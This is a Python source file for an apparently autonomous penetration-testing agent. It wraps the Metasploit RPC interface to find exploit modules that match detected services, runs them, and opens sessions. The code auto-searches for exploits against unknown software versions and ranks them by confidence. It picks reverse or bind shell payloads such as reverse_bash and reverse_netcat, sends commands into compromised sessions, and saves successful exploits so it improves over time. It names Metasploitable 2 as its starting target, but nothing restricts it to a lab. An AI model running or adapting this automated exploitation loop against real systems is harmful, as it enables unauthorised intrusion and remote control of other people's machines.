from pymetasploit3.msfrpc import MsfRpcClient
import yaml
import time
import subprocess
from pathlib import Path
from typing import Dict, Optional, List
from datetime import datetime

class MetasploitWrapper:
    """
    REAL-WORLD READY: Interface with Metasploit Framework via RPC.
    
    Features:
    - Manual curated mapping (starts with 5 Metasploitable 2 exploits)
    - Auto-discovery for unknown services (searches MSF database)
    - Agent learning (saves successful discoveries)
    - Confidence scoring (version matching, reliability)
    
    Learning Flow:
    Episode 1: Unknown "apache 2.4.50" → Auto-discover → Success → Save to auto_discovered
    Episode 50: "apache 2.4.50" → Found in auto_discovered → Use it (now "good" reliability)
    """
    
    def __init__(self, config_path: str = "apfa_agent/config/agent_config.yaml"):
        with open(config_path) as f:
            config = yaml.safe_load(f)
        
        msf_config = config['metasploit']
        
        if not msf_config.get('enabled', False):
            self.client = None
            return
        
        # Connect to MSF RPC
        try:
            self._connect(msf_config)
            print("✓ Connected to Metasploit RPC")
        except Exception as e:
            print(f"⚠️  Could not connect to Metasploit RPC: {e}")
            print("Attempting to start Metasploit RPC server...")
            if self._start_rpc_server(msf_config):
                 try:
                     self._connect(msf_config)
                     print("✓ Connected to Metasploit RPC (started automatically)")
                 except Exception as e2:
                     print(f"❌ Failed to connect after starting RPC server: {e2}")
                     self.client = None
            else:
                 self.client = None
        
        # Load module mappings
        self.mapping_path = Path(msf_config['module_map'])
        with open(self.mapping_path) as f:
            data = yaml.safe_load(f)
            self.module_map = {k.lower(): v for k, v in (data.get('modules') or {}).items()}
            self.auto_discovered = {k.lower(): v for k, v in (data.get('auto_discovered') or {}).items()}
        
        # Auto-discovery settings
        self.auto_discover_enabled = msf_config.get('auto_discover', True)
        self.confidence_threshold = msf_config.get('auto_discover_confidence_threshold', 0.6)
        self.auto_save = msf_config.get('auto_save_successful', True)
        
        # Session wait timeout (configurable)
        self.session_wait_timeout = msf_config.get('session_wait_timeout', 30)
    
    def has_module_for(self, service_signature: str) -> bool:
        """Check if we have ANY module for this service (manual or auto-discovered)"""
        sig_lower = service_signature.lower()
        return (sig_lower in self.module_map or sig_lower in self.auto_discovered)
    
    def get_module_info(self, service_signature: str) -> Optional[Dict]:
        """
        Get module information with priority:
        1. Manual mapping (highest trust) - FUZZY MATCH
        2. Auto-discovered (agent learned)
        3. Auto-discover now (search MSF database)
        """
        sig_lower = service_signature.lower()
        
        # EXACT MATCH: Check manual mapping first
        if sig_lower in self.module_map:
            return {**self.module_map[sig_lower], 'source': 'manual'}
        
        # FUZZY MATCH: Try substring/partial matches for manual mappings
        # Example: "samba smbd 3.0.20-debian" matches "samba 3.0.20"
        for key in self.module_map.keys():
            # Extract product and version from both sides
            sig_parts = sig_lower.split()
            key_parts = key.split()
            
            if len(sig_parts) >= 1 and len(key_parts) >= 1:
                # Match product name first
                product_match = False
                
                # Check if the product name matches (first word or contained in signature)
                if sig_parts[0] == key_parts[0] or key_parts[0] in sig_lower:
                    product_match = True
                
                if product_match:
                    # If signature has "unknown" version, use product-only match
                    if 'unknown' in sig_parts:
                        print(f"🔍 Product-only match (unknown version): '{sig_lower}' → '{key}'")
                        return {**self.module_map[key], 'source': 'manual_fuzzy', 'fuzzy_reason': 'unknown_version'}
                    
                    # Otherwise, check version match (fuzzy)
                    if len(sig_parts) >= 2 and len(key_parts) >= 2:
                        for sig_part in sig_parts[1:]:
                            for key_part in key_parts[1:]:
                                if sig_part.startswith(key_part) or key_part in sig_part:
                                    print(f"🔍 Fuzzy match: '{sig_lower}' → '{key}'")
                                    return {**self.module_map[key], 'source': 'manual_fuzzy', 'fuzzy_reason': 'version_match'}
        
        # Check auto-discovered
        if sig_lower in self.auto_discovered:
            return {**self.auto_discovered[sig_lower], 'source': 'auto_discovered'}
        
        # Try auto-discovery
        if self.auto_discover_enabled:
            return self.auto_discover_module(service_signature)
        
        return None
    
    def auto_discover_module(self, service_signature: str) -> Optional[Dict]:
        """
        REAL-WORLD FEATURE: Auto-discover Metasploit module for unknown service.
        
        Strategy:
        1. Extract product and version from signature
        2. Search MSF database (exact → minor → major → product)
        3. Rank results by confidence (version match + reliability)
        4. Return best match if confidence >= threshold
        
        Example:
        - Input: "apache 2.4.50"
        - Searches: ["apache 2.4.50", "apache 2.4", "apache 2", "apache"]
        - Finds: "exploit/multi/http/apache_normalize_path_rce" (CVE-2021-41773)
        - Confidence: 0.9 (exact minor version match)
        - Returns: Module info
        """
        if not self.client:
            return None
        
        try:
            # Extract product and version (smarter parsing)
            parts = service_signature.lower().split()
            
            # Find version by looking for pattern like X.X.X or X.X
            import re
            version = ""
            product_parts = []
            
            for part in parts:
                # Check if this looks like a version number
                if re.match(r'^\d+\.[\d\w\.\-]+', part):  # Matches: 2.2.8, 3.0.20-debian, 4.7p1
                    version = part
                    break
                else:
                    product_parts.append(part)
            
            # Product is everything before the version
            product = " ".join(product_parts) if product_parts else parts[0] if parts else ""
            
            # Build search queries (specific → generic)
            search_queries = []
            if version:
                major_ver = version.split('.')[0]
                minor_ver = '.'.join(version.split('.')[:2]) if '.' in version else version
                search_queries = [
                    f"{product} {version}",    # "apache 2.4.50"
                    f"{product} {minor_ver}",  # "apache 2.4"
                    f"{product} {major_ver}",  # "apache 2"
                    product                     # "apache"
                ]
            else:
                search_queries = [product]
            
            # Search MSF database
            all_results = []
            for query in search_queries:
                try:
                    results = self.client.modules.search(query)
                    # Filter for exploits only
                    exploits = [r for r in results if 'exploit/' in r.get('fullname', '')]
                    all_results.extend(exploits)
                except:
                    continue
            
            if not all_results:
                print(f"⚠️  No MSF modules found for: {service_signature}")
                return None
            
            # Rank results
            best_match = self._rank_exploits(all_results, service_signature, version)
            
            if best_match['confidence'] >= self.confidence_threshold:
                print(f"🔍 Auto-discovered: {best_match['module']} "
                      f"(confidence: {best_match['confidence']:.2f})")
                return best_match
            else:
                print(f"⚠️  Low confidence: {best_match['confidence']:.2f} < {self.confidence_threshold}")
                return None
        
        except Exception as e:
            print(f"⚠️  Auto-discovery failed: {e}")
            return None
    
    def _rank_exploits(self, exploits: List[Dict], service_sig: str, version: str) -> Dict:
        """
        Rank exploit modules by confidence.
        
        Scoring:
        - Exact version in name: +0.4
        - Major version in name: +0.3
        - Product name in name: +0.2
        - Top 10 result: +0.1
        """
        scored = []
        
        for i, exploit in enumerate(exploits):
            score = 0.0
            name = exploit.get('fullname', '').lower()
            
            # Version matching
            if version:
                if version in name:
                    score += 0.4
                elif version.split('.')[0] in name:
                    score += 0.3
            
            # Product matching
            product = service_sig.split()[0].lower()
            if product in name:
                score += 0.2
            
            # Ranking bonus (earlier = more relevant)
            if i < 10:
                score += 0.1
            
            scored.append({
                'module': exploit['fullname'],
                'confidence': min(score, 1.0),
                'rank': i,
                'discovered': True
            })
        
        return max(scored, key=lambda x: x['confidence'])
    
    def save_successful_module(
        self, 
        service_signature: str, 
        module: str, 
        success: bool
    ):
        """
        LEARNING SYSTEM: Save successful auto-discovered exploits.
        
        Reliability progression:
        - 1 success: "unverified"
        - 3 successes: "testing"
        - 5 successes: "good"
        - 10 successes: "excellent"
        """
        if not self.auto_save:
            return
        
        sig_lower = service_signature.lower()
        
        # Load current YAML
        with open(self.mapping_path) as f:
            data = yaml.safe_load(f)
        
        if 'auto_discovered' not in data:
            data['auto_discovered'] = {}
        
        # Add or update
        if sig_lower not in data['auto_discovered']:
            data['auto_discovered'][sig_lower] = {
                'module': module,
                'discovered_date': datetime.now().isoformat(),
                'success_count': 0,
                'fail_count': 0,
                'reliability': 'unverified',
                'confidence': 0.0
            }
        
        entry = data['auto_discovered'][sig_lower]
        
        if success:
            entry['success_count'] += 1
        else:
            entry['fail_count'] += 1
        
        # Update reliability
        successes = entry['success_count']
        if successes >= 10:
            entry['reliability'] = 'excellent'
        elif successes >= 5:
            entry['reliability'] = 'good'
        elif successes >= 3:
            entry['reliability'] = 'testing'
        else:
            entry['reliability'] = 'unverified'
        
        # Save back to YAML
        with open(self.mapping_path, 'w') as f:
            yaml.dump(data, f, default_flow_style=False, sort_keys=False)
        
        print(f"💾 Saved module: {service_signature} → {module} "
              f"({entry['success_count']} successes, reliability: {entry['reliability']})")
    
    def get_compatible_payloads(self, exploit_module) -> List[str]:
        """
        Get list of compatible payloads for an exploit module.
        
        Returns prioritized list of payloads to try:
        1. cmd/unix/reverse_bash (most reliable)
        2. cmd/unix/reverse_netcat
        3. cmd/unix/bind_netcat
        4. Other common Unix payloads
        """
        if not hasattr(exploit_module, 'payloads') or not exploit_module.payloads:
            # Fallback to common Unix payloads if we can't get the list
            return [
                'cmd/unix/reverse_bash',
                'cmd/unix/reverse_netcat', 
                'cmd/unix/bind_netcat',
                'cmd/unix/reverse_perl',
                'cmd/unix/reverse_python'
            ]
        
        # Filter for Unix command payloads and prioritize
        unix_payloads = []
        other_payloads = []
        
        # Payloads to exclude (problematic or non-session-creating)
        exclude_payloads = {
            'cmd/unix/interact',  # For established connections, not exploitation
        }
        
        for payload_name in exploit_module.payloads:
            # Skip excluded payloads
            if payload_name in exclude_payloads:
                continue
                
            if 'cmd/unix/' in payload_name:
                # Prioritize reverse payloads over bind payloads
                if 'reverse' in payload_name:
                    if 'bash' in payload_name:
                        unix_payloads.insert(0, payload_name)  # Highest priority
                    elif 'netcat' in payload_name:
                        unix_payloads.append(payload_name)  # High priority
                    elif 'perl' in payload_name or 'python' in payload_name:
                        unix_payloads.append(payload_name)  # Script payloads
                    else:
                        unix_payloads.append(payload_name)  # Other reverse payloads
                elif 'bind' in payload_name:
                    # Bind payloads (lower priority than reverse)
                    if 'netcat' in payload_name:
                        other_payloads.insert(0, payload_name)  # High priority bind
                    else:
                        other_payloads.append(payload_name)  # Other bind payloads
                else:
                    # Other cmd/unix payloads (add to end)
                    other_payloads.append(payload_name)
            elif 'linux/x86/' in payload_name or 'linux/x64/' in payload_name:
                # Add Linux meterpreter payloads as fallback
                other_payloads.append(payload_name)
        
        # Combine prioritized lists
        return unix_payloads + other_payloads[:5]  # Limit to reasonable number
    
    def run_exploit(self, module_path: str, options: Dict, payload: Optional[str] = None) -> Dict:
        """
        Execute a Metasploit module.
        
        Args:
            module_path: Path to the Metasploit module (e.g., 'exploit/unix/ftp/vsftpd_234_backdoor')
            options: Dictionary of module options (RHOSTS, RPORT, etc.)
            payload: Payload to use (default: auto-select compatible payload)
            
        Returns:
            Dict with success status, session_id, and output
        """
        if not self.client:
            return {'success': False, 'error': 'Metasploit not connected'}
            
        try:
            # Determine if this is an exploit or auxiliary module
            module_type = 'exploit' if 'exploit/' in module_path else 'auxiliary'
            
            print(f"    🔧 Loading {module_type}: {module_path}")
            exploit = self.client.modules.use(module_type, module_path)
            
            if not exploit:
                return {'success': False, 'error': f'Failed to load module: {module_path}'}
            
            # Set options
            print(f"    ⚙️  Configuring options...")
            for key, value in options.items():
                if key in exploit.options:
                    exploit[key] = value
                    print(f"       • {key} = {value}")
            
            # Handle payload selection for exploits
            if module_type == 'exploit':
                # Get compatible payloads if none specified or if specified payload is invalid
                if not payload:
                    compatible_payloads = self.get_compatible_payloads(exploit)
                    payload = compatible_payloads[0] if compatible_payloads else None
                    print(f"    🎯 Auto-selected payload: {payload}")
                else:
                    # Verify the specified payload is compatible
                    compatible_payloads = self.get_compatible_payloads(exploit)
                    if payload not in compatible_payloads:
                        print(f"    ⚠️  Specified payload '{payload}' not compatible, trying alternatives...")
                        payload = compatible_payloads[0] if compatible_payloads else None
                        print(f"    🔄 Using compatible payload: {payload}")
                
                # If still no compatible payload, try execution without one (some exploits don't need payloads)
                if not payload:
                    print(f"    ⚠️  No compatible payload found, trying without payload...")
            else:
                print(f"    📋 Auxiliary module - no payload needed")
                payload = None
            
            # Store pre-execution session count
            pre_sessions = set(self.client.sessions.list.keys()) if hasattr(self.client.sessions.list, 'keys') else set()
            
            # Execute the exploit with fallback logic
            execution_success = False
            last_error = None
            
            if module_type == 'exploit' and payload:
                # Try with the selected payload first
                try:
                    print(f"    🚀 Executing with payload: {payload}")
                    job = exploit.execute(payload=payload)
                    execution_success = True
                except ValueError as e:
                    print(f"    ❌ Payload failed: {e}")
                    last_error = str(e)
                    
                    # Try fallback payloads
                    compatible_payloads = self.get_compatible_payloads(exploit)
                    for fallback_payload in compatible_payloads[1:3]:  # Try up to 3 fallbacks
                        try:
                            print(f"    🔄 Trying fallback payload: {fallback_payload}")
                            job = exploit.execute(payload=fallback_payload)
                            execution_success = True
                            payload = fallback_payload  # Update to successful payload
                            print(f"    ✅ Success with fallback payload: {fallback_payload}")
                            break
                        except ValueError as e2:
                            print(f"    ❌ Fallback payload failed: {e2}")
                            last_error = str(e2)
                            continue
                    
                    if not execution_success:
                        # Try without payload as last resort
                        try:
                            print(f"    🔄 Trying without payload...")
                            job = exploit.execute()
                            execution_success = True
                            payload = None
                        except Exception as e3:
                            last_error = str(e3)
            else:
                # Auxiliary module or no payload
                try:
                    print(f"    🚀 Executing...")
                    job = exploit.execute()
                    execution_success = True
                except Exception as e:
                    last_error = str(e)
            
            if not execution_success:
                return {'success': False, 'error': f'All payload attempts failed: {last_error}'}
            
            # Wait for session creation (configurable timeout)
            import time
            max_wait = self.session_wait_timeout
            wait_interval = 0.5
            elapsed = 0
            
            print(f"    ⏳ Waiting for session (max {max_wait}s)...")
            
            while elapsed < max_wait:
                time.sleep(wait_interval)
                elapsed += wait_interval
                
                # Check for new sessions
                current_sessions = self.client.sessions.list
                if current_sessions:
                    post_sessions = set(current_sessions.keys())
                    new_sessions = post_sessions - pre_sessions
                    
                    if new_sessions:
                        # Get the newest session
                        session_id = list(new_sessions)[0]
                        print(f"    ✅ Session opened: {session_id}")
                        
                        # Get session info
                        session_info = current_sessions[session_id]
                        session_type = session_info.get('type', 'unknown')
                        target_host = session_info.get('target_host', 'unknown')
                        
                        return {
                            'success': True,
                            'session_id': session_id,
                            'session_type': session_type,
                            'target_host': target_host,
                            'output': f'Session {session_id} opened on {target_host}'
                        }
            
            # Timeout - no session created
            print(f"    ⚠️  No session created within {max_wait}s")
            return {
                'success': False,
                'error': 'Exploit executed but no session created (may have succeeded without callback)'
            }
                
        except Exception as e:
            print(f"    ❌ MSF execution failed: {e}")
            import traceback
            traceback.print_exc()
            return {'success': False, 'error': str(e)}
    
    def _connect(self, msf_config):
        """Helper to establish connection"""
        self.client = MsfRpcClient(
            msf_config['password'],
            server=msf_config['rpc_host'],
            port=msf_config['rpc_port'],
            ssl=msf_config['rpc_ssl']
        )

    def interact_with_session(self, session_id: str, commands: List[str]) -> Dict[str, str]:
        """
        Run commands in a Metasploit session and collect output.
        
        Args:
            session_id: The session ID to interact with
            commands: List of commands to execute
            
        Returns:
            Dictionary mapping command to output
        """
        if not self.client:
            return {}
        
        results = {}
        
        try:
            session = self.client.sessions.session(session_id)
            
            import time
            for cmd in commands:
                try:
                    # Send command
                    session.write(cmd + "\n")
                    
                    # Wait for output
                    time.sleep(1)
                    
                    # Read output
                    output = session.read()
                    results[cmd] = output if output else "[No output]"
                    
                except Exception as e:
                    results[cmd] = f"[Error: {e}]"
            
            return results
            
        except Exception as e:
            print(f"    ⚠️  Session interaction failed: {e}")
            return {}
    
    def _start_rpc_server(self, msf_config) -> bool:
        """Attempt to start msfrpcd"""
        try:
            cmd = [
                "msfrpcd",
                "-U", msf_config['username'],
                "-P", msf_config['password'],
                "-p", str(msf_config['rpc_port']),
                "-S", # Disable SSL for local if configured that way, but config has ssl option. 
                      # The config has 'rpc_ssl', if false we should probably use -S.
                "-a", msf_config['rpc_host']
            ]
            
            # Adjust SSL flag based on config
            if msf_config.get('rpc_ssl', False):
                # Remove -S if it was added, or just don't add it. 
                # msfrpcd defaults to SSL enabled. -S disables it.
                cmd.remove("-S")
            
            print(f"[*] Starting Metasploit RPC: {' '.join(cmd)}")
            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            # Wait for it to initialize
            print("[*] Waiting 15s for Metasploit to initialize...")
            time.sleep(15)
            return True
        except Exception as e:
            print(f"❌ Failed to start msfrpcd: {e}")
            return False
